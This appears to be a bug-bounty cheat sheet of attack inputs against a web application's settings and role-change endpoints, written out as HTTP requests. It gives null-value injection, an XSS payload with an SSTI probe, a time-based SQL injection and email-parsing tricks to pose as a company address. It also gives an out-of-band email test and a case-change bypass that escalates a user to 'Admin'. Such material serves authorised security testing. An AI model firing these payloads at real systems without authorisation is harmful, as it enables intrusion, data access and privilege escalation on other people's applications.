##### Null Payload Everywhere to get weird response
````
POST /settings

email, user, pass, or phone=NULL&token=csrf
````
##### Injecting XSS, SSTI payload in username or name field
````
POST /settings

username='''><svg/onload=prompt('xss');>{{7*7}}&token=csrf
    OR 
   only ssti payload in username
 username={{7*7}}
 
````
##### SQLI payload in Username field
````
POST /settings

username=' or sleep(20)'&token=csrf
````
##### If there is option to add second email, add with company email
````
POST /settings

email= any@company.com&action=add

email=samsec@gmail.com@company.com
email=any@burpcollaborator.net

````
##### CASE SENSITIVE IDORS [If Role change option is there and using admin throw no permission, try chaning case of admin to (Admin)]
````
POST /user/changeroles

{"id"=10,"role"="admin"}               response: {"error":"no_permission"}


change to 
{"id"=10,"role"="Admin"}                response: {"status":"OK"}
````
